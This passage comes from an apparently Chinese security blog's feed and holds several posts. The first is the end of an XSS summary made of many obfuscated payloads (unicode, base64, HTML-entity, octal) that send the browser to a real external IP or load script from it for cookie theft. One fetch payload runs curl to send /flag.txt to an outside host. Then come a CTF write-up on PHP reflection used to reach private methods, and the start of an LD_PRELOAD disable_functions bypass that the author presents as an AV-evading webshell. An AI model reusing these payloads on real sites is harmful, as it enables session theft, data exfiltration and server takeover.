onload=location=&apos;javascri&apos;.concat(&quot;pt:document&quot;,&quot;.location=&quot;,&quot;&apos;http://120.77.176.168:11122&apos;&quot;)&gt;</span><br></pre></td></tr></table></figure><p>4.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://120.77.176.1&apos;.concat(&apos;68:111&apos;,&apos;22&apos;); &gt;</span><br></pre></td></tr></table></figure><p>5.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=s=createElement(&apos;script&apos;);body.appendChild(s);s.src=&apos;http://120.77.176.1&apos;.\u0063oncat(&apos;68:111&apos;,&apos;22&apos;); &gt;</span><br></pre></td></tr></table></figure><p>6.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe onload=location=[&quot;java&quot;,&quot;script:&quot;,&quot;document.location=&quot;,&quot;&apos;http://120.77.176.168:11122&apos;&quot;].join(&quot;&quot;)&gt;</span><br></pre></td></tr></table></figure><p>7.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;body/onload=document.write(String.fromCharCode(60,115,67,114,73,112,116,32,115,114,67,61,39,104,116,116,112,58,47,47,49,50,48,46,55,55,46,49,55,54,46,49,54,56,58,49,49,49,50,50,39,62,60,47,115,67,82,105,112,84,62)) &gt;</span><br></pre></td></tr></table></figure><p>8.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=setTimeout(&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027&quot;)&gt;</span><br></pre></td></tr></table></figure><h2 id="XSS窃取cookie-变形"><a href="#XSS窃取cookie-变形" class="headerlink" title="XSS窃取cookie 变形"></a>XSS窃取cookie 变形</h2><h3 id="HTML编码绕过"><a href="#HTML编码绕过" class="headerlink" title="HTML编码绕过"></a>HTML编码绕过</h3><p>1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=&quot;&amp;#x6A;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;:&amp;#x64;&amp;#x6F;&amp;#x63;&amp;#x75;&amp;#x6D;&amp;#x65;&amp;#x6E;&amp;#x74;&amp;#x2E;&amp;#x6C;&amp;#x6F;&amp;#x63;&amp;#x61;&amp;#x74;&amp;#x69;&amp;#x6F;&amp;#x6E;&amp;#x3D;&apos;&amp;#x68;&amp;#x74;&amp;#x74;&amp;#x70;&amp;#x3A;&amp;#x2F;&amp;#x2F;&amp;#x31;&amp;#x32;&amp;#x30;&amp;#x2E;&amp;#x37;&amp;#x37;&amp;#x2E;&amp;#x31;&amp;#x37;&amp;#x36;&amp;#x2E;&amp;#x31;&amp;#x36;&amp;#x38;&amp;#x3A;&amp;#x31;&amp;#x31;&amp;#x31;&amp;#x32;&amp;#x32;&apos;&quot;&gt;</span><br></pre></td></tr></table></figure><h3 id="unicode编码绕过"><a href="#unicode编码绕过" class="headerlink" title="unicode编码绕过"></a>unicode编码绕过</h3><p>1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(&apos;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027&apos;) &gt;</span><br></pre></td></tr></table></figure><p>2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg/onload=\u0073etTimeout(&quot;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027&quot;)&gt;</span><br></pre></td></tr></table></figure><h3 id="Base64编码绕过"><a href="#Base64编码绕过" class="headerlink" title="Base64编码绕过"></a>Base64编码绕过</h3><p>1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(atob(&apos;amF2YXNjcmlwdDpkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzEyMC43Ny4xNzYuMTY4OjExMTIyJw==&apos;)) &gt;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;video src=1 onerror=eval(atob(&apos;amF2YXNjcmlwdDpkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzEyMC43Ny4xNzYuMTY4OjExMTIyJw==&apos;))&gt;</span><br></pre></td></tr></table></figure><h3 id="js8编码绕过"><a href="#js8编码绕过" class="headerlink" title="js8编码绕过"></a>js8编码绕过</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=eval(&apos;\152\141\166\141\163\143\162\151\160\164\72\144\157\143\165\155\145\156\164\56\154\157\143\141\164\151\157\156\75\47\150\164\164\160\72\57\57\61\62\60\56\67\67\56\61\67\66\56\61\66\70\72\61\61\61\62\62\47&apos;) &gt;</span><br></pre></td></tr></table></figure><h3 id="混合编码绕过"><a href="#混合编码绕过" class="headerlink" title="混合编码绕过"></a>混合编码绕过</h3><p>1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;details open ontoggle=\u0065val(atob(&apos;amF2YXNjcmlwdDpkb2N1bWVudC5sb2NhdGlvbj0naHR0cDovLzEyMC43Ny4xNzYuMTY4OjExMTIyJw==&apos;)) &gt;</span><br></pre></td></tr></table></figure><p>2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=x onerror=window[&apos;eva&apos;+&apos;l&apos;](&apos;\u006a\u0061\u0076\u0061\u0073\u0063\u0072\u0069\u0070\u0074\u003a\u0064\u006f\u0063\u0075\u006d\u0065\u006e\u0074\u002e\u006c\u006f\u0063\u0061\u0074\u0069\u006f\u006e\u003d\u0027\u0068\u0074\u0074\u0070\u003a\u002f\u002f\u0031\u0032\u0030\u002e\u0037\u0037\u002e\u0031\u0037\u0036\u002e\u0031\u0036\u0038\u003a\u0031\u0031\u0031\u0032\u0032\u0027&apos;) &gt;</span><br></pre></td></tr></table></figure><h2 id="xss-POST-amp-GET请求"><a href="#xss-POST-amp-GET请求" class="headerlink" title="xss POST&amp;GET请求"></a>xss POST&amp;GET请求</h2><p>1.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;fetch(&apos;exec.php&apos;,&#123;method:&apos;POST&apos;,headers:&#123;&apos;content-type&apos;:&apos;application/x-www-form-urlencoded&apos;&#125;,body:&apos;command=&apos;+encodeURIComponent(&apos;curl xss.zsxsoft.com:23457 -F&quot;a=@/flag.txt&quot;&apos;)+&apos;&amp;exec=1&apos;&#125;).then(p=&gt;p.text()).then(p=&gt;fetch(&apos;main.php&apos;,&#123;method:&apos;POST&apos;,headers:&#123;&apos;content-type&apos;:&apos;application/x-www-form-urlencoded&apos;&#125;,body:&apos;comment=&apos;+p&#125;))&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>2.</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe srcdoc=&quot;&lt;script&gt;fetch(&apos;exec.php&apos;,&#123;method:&apos;POST&apos;,headers:&#123;&apos;content-type&apos;:&apos;application/x-www-form-urlencoded&apos;&#125;,body:&apos;command=&apos;+encodeURIComponent(&apos;&apos;)&#125;).then(p=&gt;p.text()).then(p=&gt;fetch(&apos;main.php&apos;,&#123;method:&apos;POST&apos;,headers:&#123;&apos;content-type&apos;:&apos;application/x-www-form-urlencoded&apos;&#125;,body:&apos;comment=&apos;+p&#125;))&lt;/script&gt; &quot;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p><a href="https://www.anquanke.com/post/id/176185" target="_blank" rel="noopener">测试WAF来学习XSS姿势</a></p><p><a href="https://www.freebuf.com/articles/web/153055.html" target="_blank" rel="noopener">XSS过滤绕过速查表</a></p>]]></content>
    
    <summary type="html">
    
      对xss进行一个小小的总结
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="xss" scheme="https://museljh.github.io/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>ctf中的php反射</title>
    <link href="https://museljh.github.io/2019/04/24/ctf%E4%B8%AD%E7%9A%84php%E5%8F%8D%E5%B0%84/"/>
    <id>https://museljh.github.io/2019/04/24/ctf中的php反射/</id>
    <published>2019-04-24T07:20:07.000Z</published>
    <updated>2019-04-24T07:31:56.343Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>在2019CISCN中有这么一道题目需要我们通过PHP反射机制调用私有函数最终得到Flag，感觉十分神奇于是来探究下。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><blockquote><p>反射通常被定义为程序在执行时检查自身并修改其逻辑的能力。在技术方面，反射是要求对象告诉你它的属性和方法，并改变那些成员（甚至是私有成员）。</p></blockquote><p>在如上对于反射的定义我们不难发现通过反射我们能够修改一个程序逻辑包括属性、方法。并且不仅仅能够改变Public成员，甚至能够改变Private成员，可以说是一种十分实用的特性，我将结合2019CISCN题目来对对其进行分析。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">if (!defined(&apos;LFI&apos;)) &#123;</span><br><span class="line">    echo &quot;Include me!&quot;;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">use interesting\FlagSDK;</span><br><span class="line">$sdk = new FlagSDK();</span><br><span class="line">$key = $_GET[&apos;key&apos;] ?? false;</span><br><span class="line">if (!$key) &#123;</span><br><span class="line">    echo &quot;Please provide access key&lt;br \&gt;&quot;;</span><br><span class="line">    echo &apos;$_GET[&quot;key&quot;];&apos;;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br><span class="line">$flag = $sdk-&gt;verify($key);</span><br><span class="line">if ($flag) &#123;</span><br><span class="line">    echo $flag;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    echo &quot;Wrong Key&quot;;</span><br><span class="line">    exit();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>刚看到这题的时候我们队开始时是想通过<code>var_dump($sdk-&gt;getHash());</code>直接获取hash值的，但是由于这个方法是Private方法所以是不能直接var_dump出结果的，会报出如下错误<code>&lt;b&gt;Fatal error&lt;/b&gt;:  Call to private method FlagSDK::getHash() from context</code><br>猜测题目应该是这样的：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">class FlagSDK &#123;</span><br><span class="line"></span><br><span class="line">public function verify($key)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> if (sha1($key) === $this-&gt;getHash()) &#123;</span><br><span class="line"></span><br><span class="line">   return &quot;too&#123;young-too-simple&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Private function getHash()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    return &apos;xxxxx&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<a href="https://www.php.net/manual/zh/book.reflection.php" target="_blank" rel="noopener">PHP手册中</a>我们能够发现很多有趣的函数，</p><p>一、 反射读取私有成员</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        //Enter your code here, enjoy!</span><br><span class="line"> class FlagSDK &#123;</span><br><span class="line">   private $hash=&apos;xxxx&apos;;</span><br><span class="line">&#125;</span><br><span class="line">$sdk = new FlagSDK();</span><br><span class="line">$reflect = new ReflectionClass($sdk);</span><br><span class="line">##var_dump($sdk-&gt;getHash());</span><br><span class="line">$props   = $reflect-&gt;getProperties(ReflectionProperty::IS_PUBLIC | ReflectionProperty::IS_PRIVATE | ReflectionProperty::IS_PROTECTED);</span><br><span class="line">foreach ($props as $prop) &#123;</span><br><span class="line">    $prop-&gt;setAccessible(true);</span><br><span class="line">    print $prop-&gt;getName() . &quot;\t&quot;;</span><br><span class="line">    print $prop-&gt;getValue($sdk).&quot;\n&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过如上的构造，我们成功得到FlagSDK类的Private成员属性<code>hash    xxxx</code></p><p>二、 反射执行私有方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        //Enter your code here, enjoy!</span><br><span class="line">class FlagSDK &#123;</span><br><span class="line">private $hash=&apos;xxxx&apos;;</span><br><span class="line">public function verify($key)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line"> if (sha1($key) === $this-&gt;getHash()) &#123;</span><br><span class="line"></span><br><span class="line">   return &quot;too&#123;young-too-simple&#125;&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">private function getHash()</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    return &apos;xxxxx&apos;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">    $hash=new FlagSDK();</span><br><span class="line">    $objReflectClass = new ReflectionClass(&apos;FlagSDK&apos;);</span><br><span class="line">    $method = $objReflectClass-&gt;getMethod(&apos;getHash&apos;);</span><br><span class="line">    $method-&gt;setAccessible(true);</span><br><span class="line">    $re=$method-&gt;invokeArgs($hash,array());</span><br><span class="line">    echo $re;</span><br></pre></td></tr></table></figure><p>通过如上的构造，我们成功得到getHash的返回值</p><p>三、 反射重构变量</p><p>1.公有变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        //Enter your code here, enjoy!</span><br><span class="line">class FlagSDK &#123;</span><br><span class="line">public $hash=&apos;xxxx&apos;;</span><br><span class="line">public function verify($key)</span><br><span class="line">&#123;</span><br><span class="line"> if (sha1($key) === $this-&gt;getHash()) &#123;</span><br><span class="line">   return &quot;Its&apos;s a flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line">private function getHash()</span><br><span class="line">&#123;</span><br><span class="line">    return &apos;xxxxx&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$FlagSDK = new FlagSDK;</span><br><span class="line">$reflectionClass = new ReflectionClass(&apos;FlagSDK&apos;);</span><br><span class="line">$reflectionClass-&gt;getProperty(&apos;hash&apos;)-&gt;setValue($FlagSDK,&apos;aaaa&apos;);</span><br><span class="line">var_dump($FlagSDK-&gt;hash);</span><br></pre></td></tr></table></figure><p>可以看到<code>$hash</code>成功被我们修改为aaaa</p><p>2.私有变量</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        //Enter your code here, enjoy!</span><br><span class="line">class FlagSDK &#123;</span><br><span class="line">private $hash=&apos;xxxx&apos;;</span><br><span class="line">public function verify($key)</span><br><span class="line">&#123;</span><br><span class="line"> if (sha1($key) === $this-&gt;getHash()) &#123;</span><br><span class="line">   return &quot;Its&apos;s a flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line">private function getHash()</span><br><span class="line">&#123;</span><br><span class="line">    return &apos;xxxxx&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$FlagSDK = new FlagSDK;</span><br><span class="line">$reflectionClass = new ReflectionClass(&apos;FlagSDK&apos;);</span><br><span class="line">$reflectionProperty = $reflectionClass-&gt;getProperty(&apos;hash&apos;);</span><br><span class="line">$reflectionProperty-&gt;setAccessible(true);</span><br><span class="line">$reflectionProperty-&gt;setValue($FlagSDK, &apos;aaaa&apos;);</span><br><span class="line">var_dump($reflectionProperty-&gt;getValue($FlagSDK));</span><br></pre></td></tr></table></figure><p>可以看到<code>$hash</code>成功被我们修改为aaaa</p><p>四、 反射重构方法</p><p><del>依赖注入newInstanceWithoutConstructor</del></p><p>1.修改public方法返回值</p><p>2.修改private方法返回值</p><p>通过添加命名空间来控制函数、函数调用会先调用本命名空间中的同名函数（比如设置了一个interesting的命名空间假如调用sha1函数，就会先调用interesting/sha1而不是/sha1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace interesting;</span><br><span class="line">function sha1($var) &#123; // 调用类的私有、保护方法</span><br><span class="line">    $class = new \ReflectionClass(&apos;interesting\FlagSDK&apos;);</span><br><span class="line">    $method = $class-&gt;getMethod(&apos;getHash&apos;);</span><br><span class="line">    $method-&gt;setAccessible(true);</span><br><span class="line">    $instance = $class-&gt;newInstance();</span><br><span class="line">    return $method-&gt;invoke($instance);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">class FlagSDK &#123;</span><br><span class="line">protected  $flagPath;</span><br><span class="line"></span><br><span class="line">public function verify($key)</span><br><span class="line">&#123;</span><br><span class="line"> if (sha1($key) === $this-&gt;getHash()) &#123;</span><br><span class="line">   return &quot;Its&apos;s a flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line">private function getHash()</span><br><span class="line">&#123;</span><br><span class="line">    return &apos;xxxxx&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">$a =new FlagSDK();</span><br><span class="line">$b=$a-&gt;verify(&apos;1&apos;);</span><br><span class="line">echo $b;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>通过伪造sha1函数，成功返回flag</p><p>后来寻思着想不能能通过依赖注入的方式注入一个类到<code>$flagPath</code>变量中，这里有我只是提供个思路具体行不行我也不知道：1.修改<code>$flagPath</code> 也就是<code>/var/www/html/flag.txt</code>，改成我们能够控制的路径文件进行解密，不过我对于加密解密不是很了解就不往深处想了。2.<del>依赖注入一个类使得这个类直接调用</del>（好吧其实是多次一举，我上面已经说可以直接修改了<code>$flagPath</code>变量了，也不用整个依赖注入。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        //Enter your code here, enjoy!</span><br><span class="line">class dep &#123;</span><br><span class="line">&#125;</span><br><span class="line">class FlagSDK &#123;</span><br><span class="line">protected  $flagPath;</span><br><span class="line">public function verify($key)</span><br><span class="line">&#123;</span><br><span class="line"> if (sha1($key) === $this-&gt;getHash()) &#123;</span><br><span class="line">   return &quot;Its&apos;s a flag&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">  return false;</span><br><span class="line">&#125;</span><br><span class="line">public function getHash()</span><br><span class="line">&#123;</span><br><span class="line">    return &apos;xxxxx&apos;;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$ref = new ReflectionClass(&apos;FlagSDK&apos;);</span><br><span class="line">$inst = $ref-&gt;newInstanceWithoutConstructor();</span><br><span class="line">$list = $ref-&gt;getProperties();</span><br><span class="line">foreach($list as $prop)&#123;</span><br><span class="line">  /* @var $prop ReflectionProperty */</span><br><span class="line">  $prop-&gt;getDocComment(); //grep for @inject and the @vars class name</span><br><span class="line">  $prop-&gt;setAccessible(true);</span><br><span class="line">  $prop-&gt;setValue($inst, new dep());</span><br><span class="line">&#125;</span><br><span class="line">if($const = $ref-&gt;getConstructor()) &#123;</span><br><span class="line">  $constName = $const-&gt;getName();</span><br><span class="line">  $inst-&gt;&#123;$constName&#125;(); //use call_user_func_array($function, $param_arr); for arguments </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">print_r($inst);</span><br><span class="line">print_r($inst-&gt;verify(&apos;1&apos;)); //property still not accessable</span><br></pre></td></tr></table></figure><p>这样我们就可以注入一个dep类到<code>$flagPath</code>中了（实际上貌似没有啥用。</p><p>五、其他</p><p>当然通过反射我们能够实现很多其他有趣的东西，具体的化可以看PHP手册。</p>]]></content>
    
    <summary type="html">
    
      使用PHP反射性质修改PHP函数，属性等
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="php" scheme="https://museljh.github.io/tags/php/"/>
    
  </entry>
  
  <entry>
    <title>bypass disable function的学习与实践</title>
    <link href="https://museljh.github.io/2019/03/29/bypass%20disable%20function%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E8%B7%B5/"/>
    <id>https://museljh.github.io/2019/03/29/bypass disable function的学习与实践/</id>
    <published>2019-03-29T06:24:01.000Z</published>
    <updated>2019-03-29T06:36:36.091Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>当千辛万苦拿到的webshell居然无法执行系统命令无疑是令人抓狂的。那么我们该如何绕过它呢？这里主要以Insomnihack Teaser 2019 Web题 l33t-hoster来讲解，本文主要讲通过LD_PRELOAD 来达到bypass的目的。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>相信大家都知道PHP.ini中有的php控制器functions_disable会禁用一些危险的系统函数防止被黑客攻击。例如<code>system（）</code>或<code>exec（）</code>或<code>shell_exec（）</code>，甚至我们不太知道的函数，如<code>dl（）</code><br>那么该怎么办呢？我们可以通过一定手法进行bypass disable_functions<br>有四种绕过 disable_functions 的手法：第一种，攻击后端组件，寻找存在命令注入的、web 应用常用的后端组件，如，ImageMagick 的魔图漏洞、bash 的破壳漏洞；第二种，寻找未禁用的漏网函数，常见的执行命令的函数有 system()、exec()、shell_exec()、passthru()，偏僻的 popen()、proc_open()、pcntl_exec()，逐一尝试，或许有漏网之鱼；第三种，mod_cgi 模式，尝试修改 .htaccess，调整请求访问路由，绕过 php.ini 中的任何限制；第四种，利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p><p>一.利用环境变量 LD_PRELOAD 劫持系统函数，让外部程序加载恶意 *.so，达到执行系统命令的效果。</p><p>我们可以通过PHP中mail（）函数使用LD_PRELOAD变量注入一些恶意的应用程序中比如getuid（）<br>提起LD_PRELOAD变量先说明下程序的链接，程序的链接分为静态链接和动态链接，动态链接程序运行时动态地载入函数库，但一旦我们采取动态链接我们的程序就有被‘劫持’的可能<br>在UNIX的动态链接库的世界中，LD_PRELOAD就是这样一个环境变量，它可以影响程序的运行时的链接（Runtime linker）。很明显通过这个环境变量，我们可以在主程序和其动态链接库的中间加载别的动态链接库，甚至覆盖正常的函数库。</p><p>而mail（）函数，mail（）函数会在/ usr / sbin / sendmail里面启动，而我们的脚本将会调用一些系统函数（API如getuid（）），我们可以通过LD_PRELOAD来注入一些恶意代码。</p><p>所以这里我们的bypass思路很明显了使用mail（）函数通过LD_PRELOAD变量覆盖，达到执行系统函数的目的。<br>payload（它是免杀的哦，可以当作小马使用）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    echo &quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;;</span><br><span class="line">    $cmd = 